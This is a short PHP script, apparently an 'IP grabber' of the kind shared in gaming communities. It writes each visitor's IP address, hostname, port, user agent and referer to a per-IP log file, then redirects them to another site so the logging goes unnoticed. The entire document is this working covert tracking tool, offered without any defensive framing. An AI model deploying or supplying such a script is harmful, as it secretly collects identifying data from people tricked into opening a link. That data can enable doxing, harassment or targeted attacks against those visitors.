<?php
    $protocol = $_SERVER['SERVER_PROTOCOL'];
	$ip = $_SERVER['REMOTE_ADDR'];
	$port = $_SERVER['REMOTE_PORT'];
	$agent = $_SERVER['HTTP_USER_AGENT'];
	$ref = $_SERVER['HTTP_REFERER'];
	$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);

    //Print IP, Hostname, Port Number, User Agent and Referer To log.txt
	//PHP coded by @GeckocoRBLX on twaitter 
	$fh = fopen('ips/'.$ip.'.txt', 'w');
	fwrite($fh, 'IP Address: '."".$ip ."\n");
	fwrite($fh, 'Hostname: '."".$hostname ."\n");
	fwrite($fh, 'Port Number: '."".$port ."\n");
	fwrite($fh, 'User Agent: '."".$agent ."\n");
	fwrite($fh, 'HTTP Referer: '."".$ref ."");
	fclose($fh);
	header('Location: http://www.example.com/');
?>
